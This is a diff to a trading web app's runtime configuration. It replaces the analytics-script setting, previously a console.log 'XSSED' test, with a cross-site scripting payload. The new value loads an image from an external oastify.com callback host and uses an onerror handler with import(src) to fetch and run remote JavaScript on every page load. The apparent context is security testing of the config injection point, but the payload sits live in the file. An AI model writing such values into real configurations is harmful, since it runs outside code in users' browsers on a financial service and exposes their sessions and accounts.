@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>console.log(\"XSSED\");</script>",
+  "VITE_ANALYTICS_SCRIPT": "<input><marquee>HELLO<img src=http://143gq2e31zvloe90aywnl17ah1ntbkz9.oastify.com/orderly.png><Img Src=//143gq2e31zvloe90aywnl17ah1ntbkz9.oastify.com?1=23673 OnError=import(src)>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
